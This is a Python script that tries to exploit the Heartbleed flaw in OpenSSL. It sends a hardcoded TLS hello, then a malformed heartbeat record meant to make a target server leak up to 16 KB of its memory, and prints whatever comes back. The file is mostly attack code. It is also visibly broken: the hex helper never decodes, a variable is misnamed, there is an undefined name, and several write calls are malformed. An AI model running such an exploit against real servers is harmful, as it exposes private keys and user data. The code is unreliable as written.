import time
import select
import re
import socket
import struct
import ssl
import sys
import pyfancy
import codecs

def h2bin(x):
    x.replace(' ', '').replace('\n', '')
    x = codecs.getdecoder('hex_codec')
    return x

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                 
''')

heartbleed = h2bin('''
18 03 02 00 03 
01 40 00
''')

def recvall (sock , size):
    buf=b''
    while size:
        newbuf = sock.recv(size)
        if not newbuf :return None
        buf+=newbuf
        size -=len(newbuf)
    return buf

def exec_heartbleed(sock):

    sock.send(heartbleed)
    while True:
        hdr.recv(5)
        if hdr is None:
            print("Unexpected receiver of record header , server closed connection")
            return False

        (content_type , version , length) = struct.unpack('>BHH' ,hdr)
        if content_type is None:
            print("No heartbeat response  , server not vulnerable")
            return False

        payload=  recvall(sock , length)
        if payload is None:
            print("No heartbeat payload , server closed connection")
            return False

        sys.stdout.write(' ... received message: type = %d, ver = %04x, length = ' % (content_type, version))

        if (content_type == 24 and len(payload)>3):
            print ("Received heartbeat response and more data than expected")
            sys.stdout.write(pyfancy.RED  , str(len(payload)) , "WARNING: ", pyfancy.END , "Server vulnerable")
            sys.stdout.write(payload)
            return True
        else:
            sys.stdout.write("Different content type or payload length than desired" , content_type , len(payload))
            sys.stdout.write(payload)

        if (content_type ==24 and len(payload)<3):
            print("Heartbeat response but no extra data...")
            sys.stdout.write(pyfancy.RED , str(len(payload)) , pyfancy.END)
            sys.stdout.write(payload)
            return True

        if (content_type ==21):
            print("Alert: ")
            sys.stdout.write(payload)
            print ("Server returned error")
            return True

if __name__ =='__main__':

    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

    in_1 = input("Host: ")
    in_2 = input("Port: ")
    print("Connecting to host:" ,in_1 ,"on port:" ,in_2)
    s.connect((in_1 , int(in_2)))
    print("Sending hello to the server")
    s.send(hello)
    while True:
        hdr = s.recv(5)
        (content_type , version , length) = struct.unpack(">BHH" , hdr)
        handshake = recvall(s , length)
        print (' ... received message: type = %d, ver = %04x, length = %d' % (content_type, version, len(hand)))

        if content_type==22 and ord(handshake[0])==0x0E:
            break

    print("Handshake done...")
    print("Sending heartbeat with length: " , pyfancy.RED , "4" , pyfancy.END , "...")
    exec_heartbleed(s)


